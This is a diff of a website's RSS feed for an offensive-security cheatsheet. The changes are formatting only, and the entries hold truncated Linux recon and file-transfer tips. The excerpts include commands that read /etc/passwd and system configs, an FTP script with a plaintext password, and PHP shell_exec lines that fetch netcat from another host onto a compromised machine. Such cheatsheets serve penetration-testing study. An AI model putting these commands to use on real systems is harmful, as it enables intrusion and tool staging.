@@ -1,15 +1,11 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Linux Systems on Offensive Security Cheatsheet</title>
     <link>/linux-systems/</link>
     <description>Recent content in Linux Systems on Offensive Security Cheatsheet</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    
-	<atom:link href="/linux-systems/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>en-us</language><atom:link href="/linux-systems/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Global Tricks (sysadmin)</title>
       <link>/linux-systems/tricks/</link>
@@ -17,7 +13,7 @@
       
       <guid>/linux-systems/tricks/</guid>
       <description>[WIP]
-MISC / TIPS # If you need to kill a specific process using a given port sudo fuser -k 445/tcp# You can use the following trick to easy navigate and select paths or others args # $_ takes the last argument of the last simplec command executed cd $_ # For example mkdir my-folder &amp;amp;&amp;amp; cd $_# You can use xclip to automate clipping # Can be usefull for long outputs (enum4linux, privcheck.</description>
+MISC / TIPS # If you need to kill a specific process using a given port sudo fuser -k 445/tcp # You can use the following trick to easy navigate and select paths or others args # $_ takes the last argument of the last simplec command executed cd $_ # For example mkdir my-folder &amp;amp;&amp;amp; cd $_ # You can use xclip to automate clipping # Can be usefull for long outputs (enum4linux, privcheck.</description>
     </item>
     
     <item>
@@ -26,8 +22,7 @@ MISC / TIPS # If you need to kill a specific process using a given port sudo fus
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/recon_enumeration/</guid>
-      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 
-Basics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
+      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 Basics hostname whoami id ifconfig uname -a uname -m # Check version using  searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
     </item>
     
     <item>
@@ -36,8 +31,7 @@ Basics hostname whoami id ifconfig uname -a uname -m # Check version using searc
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/file_transfer/</guid>
-      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a 
-Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.</description>
+      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?</description>
     </item>
     
   </channel>
